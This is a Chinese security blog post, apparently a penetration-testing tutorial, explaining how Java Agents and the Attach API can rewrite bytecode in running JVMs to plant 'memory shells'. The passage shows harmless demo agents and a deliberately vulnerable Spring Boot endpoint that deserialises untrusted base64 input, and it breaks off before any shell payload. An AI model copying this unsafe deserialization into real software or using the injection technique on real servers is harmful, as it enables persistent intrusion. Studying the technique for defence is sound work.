@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="Java Agent在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，通过 java.lang.instrument 实现的工具我们称之为 Java Agent ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法 Agent">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Agent Memory Shell">
+<meta property="og:url" content="https://jlkl.github.io/2022/05/26/Java-10/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="Java Agent在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，通过 java.lang.instrument 实现的工具我们称之为 Java Agent ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法 Agent">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/aGOMB_n_kACRcvX2UDO-kP61hyQWrRv4sQ5gyRUugWI.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/20ebFQBYSnOA_NaJVoxqHlY-fSnpPy1Hd4GlWNTNBAk.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/SrPFYGcZdwK9OdVOvC1QKDRBJyq5BlwD2vZHkQvUMWY.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/sIrVZUR-OO6A2T55v0W_1hsxpeTN0AKoHp0ibz6g7xw.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/0mHSpHusuEX2B8gLJsyh3Y6ksE7wpVitwGubba6A7-s.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/LQ9cOwEz_8HnQ20S-dOuNV6vqWXYgyeRVHlpC_Tg4Ys.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/0XzoegTtVE83fYSHvTnlbXwbw6r8QtMv0LD8xh188xk.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/JCscSiPX1SgO9AZvxvU97IU__JNFFYmaZ5D572N9z5s.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-10/96tVzJzR83kkeNYB5OU-SnIdFGHcbh0D-6DKok0OmhU.png">
+<meta property="article:published_time" content="2022-05-26T01:45:25.000Z">
+<meta property="article:modified_time" content="2022-05-26T01:49:00.237Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2022/05/26/Java-10/aGOMB_n_kACRcvX2UDO-kP61hyQWrRv4sQ5gyRUugWI.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2022/05/26/Java-10/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Agent Memory Shell | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">44</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2022/05/26/Java-10/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Agent Memory Shell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-05-26 09:45:25 / Modified: 09:49:00" itemprop="dateCreated datePublished" datetime="2022-05-26T09:45:25+08:00">2022-05-26</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2022/05/26/Java-10/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/26/Java-10/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>14 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，<strong>通过 java.lang.instrument 实现的工具我们称之为 Java Agent</strong> ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法</p>
+<p>Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去</p>
+<p>说白了 Java Agent 只是一个 Java 类而已，只不过普通的 Java 类是以 main 函数作为入口点的，Java Agent 的入口点则是 premain 和 agentmain</p>
+<p>Java Agent 支持两种方式进行加载：</p>
+<ol>
+<li>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</li>
+<li>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</li>
+</ol>
+<a id="more"></a>
+<h3 id="启动时加载-agent"><a href="#启动时加载-agent" class="headerlink" title="启动时加载 agent"></a>启动时加载 agent</h3><p>premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法</p>
+<p>Burpsuite破解版启动时-javaagent参数使用的就是这个方法，下面举一个实际的例子</p>
+<p>JDK 1.8.311</p>
+<p>idea创建pom项目</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>菜单栏File-&gt;project stucture，添加Artifacts，选择执行的Main Class</p>
+<p><img src="/2022/05/26/Java-10/aGOMB_n_kACRcvX2UDO-kP61hyQWrRv4sQ5gyRUugWI.png" alt="image"></p>
+<p>然后菜单栏Build-&gt;Build Artifacts，在out目录下可以看到生成的jar文件</p>
+<p><img src="/2022/05/26/Java-10/20ebFQBYSnOA_NaJVoxqHlY-fSnpPy1Hd4GlWNTNBAk.png" alt="image"></p>
+<p>创建PremainDemo类，实现premain方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PremainDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String aegntArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"premain method is hooked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>MANIFEST.MF，指定Premain-Class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: PremainDemo</span><br></pre></td></tr></table></figure>
+<p>这里使用纯java命令来打包，javac将java文件编译成class文件后，使用jar打包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar MANIFEST.MF PremainDemo<span class="class">.<span class="keyword">class</span></span></span><br></pre></td></tr></table></figure>
+<p>添加<code>-javaagent</code> 参数，premain在main函数之前执行成功</p>
+<p><img src="/2022/05/26/Java-10/SrPFYGcZdwK9OdVOvC1QKDRBJyq5BlwD2vZHkQvUMWY.png" alt="image"></p>
+<p>在实际渗透测试的过程中肯定不能采用这样的方式，所以还是需要启动后加载</p>
+<h3 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h3><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p>
+<p>Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码，更加详细的介绍和方法，可以参照<a href="https://docs.oracle.com/javase/9/docs/api/java/lang/instrument/package-summary.html" target="_blank" rel="noopener">官方文档</a>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer"></a>addTransformer</h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册提供的转换器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span></span><br></pre></td></tr></table></figure>
+<p>这样当类加载的时候，会进入我们自己的 Transformer 中的 transform 函数进行拦截</p>
+<p><img src="/2022/05/26/Java-10/sIrVZUR-OO6A2T55v0W_1hsxpeTN0AKoHp0ibz6g7xw.png" alt="image"></p>
+<h5 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses"></a>getAllLoadedClasses</h5><p>getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class</p>
+<p><img src="/2022/05/26/Java-10/0mHSpHusuEX2B8gLJsyh3Y6ksE7wpVitwGubba6A7-s.png" alt="image"></p>
+<h5 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses"></a>retransformClasses</h5><p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果</p>
+<p><img src="/2022/05/26/Java-10/LQ9cOwEz_8HnQ20S-dOuNV6vqWXYgyeRVHlpC_Tg4Ys.png" alt="image"></p>
+<h3 id="启动后加载agent"><a href="#启动后加载agent" class="headerlink" title="启动后加载agent"></a>启动后加载agent</h3><p>在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent，主要涉及VirtualMachine这个类，有以下几个重要的方法</p>
+<p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachine vm &#x3D; VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure>
+<p><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</p>
+<p><strong>Detach</strong>：从 JVM 上面解除一个代理(agent)</p>
+<p>大概流程就是：通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
+<p><img src="/2022/05/26/Java-10/0XzoegTtVE83fYSHvTnlbXwbw6r8QtMv0LD8xh188xk.png" alt="image"></p>
+<p>Demo</p>
+<p>AgentMainDemo.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>DefineTransformer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>MANIFEST.MF</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="keyword">true</span></span><br><span class="line">Agent-Class: AgentMainDemo</span><br></pre></td></tr></table></figure>
+<p>如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can-Retransform-Classes 是否支持类的重新替换</span><br><span class="line">Can-Redefine-Classes 是否支持类的重新定义</span><br></pre></td></tr></table></figure>
+<p>打包agent.jar</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar MANIFEST.MF AgentMainDemo<span class="class">.<span class="keyword">class</span> <span class="title">DefineTransformer</span>.<span class="title">class</span></span></span><br></pre></td></tr></table></figure>
+<p>测试类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String path = <span class="string">"/Users/str3am/Documents/Projects/agent-test/src/main/java/agent.jar"</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v : list) &#123;</span><br><span class="line">            <span class="comment">//System.out.println(v.displayName());</span></span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">"Main"</span>)) &#123;</span><br><span class="line">                <span class="comment">// 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接</span></span><br><span class="line">                VirtualMachine vm = VirtualMachine.attach(v.id());</span><br><span class="line">                System.out.println(<span class="string">"id - &gt;&gt;&gt; "</span> + v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/26/Java-10/JCscSiPX1SgO9AZvxvU97IU__JNFFYmaZ5D572N9z5s.png" alt="image"></p>
+<p>这里只是Demo测试，输出了加载的类名</p>
+<h2 id="Agent-Memory-Shell"><a href="#Agent-Memory-Shell" class="headerlink" title="Agent Memory Shell"></a>Agent Memory Shell</h2><p>搭建一个cc5的springboot环境</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.agentmemoryshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Vuln</span><span class="params">(String payload)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(payload)));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
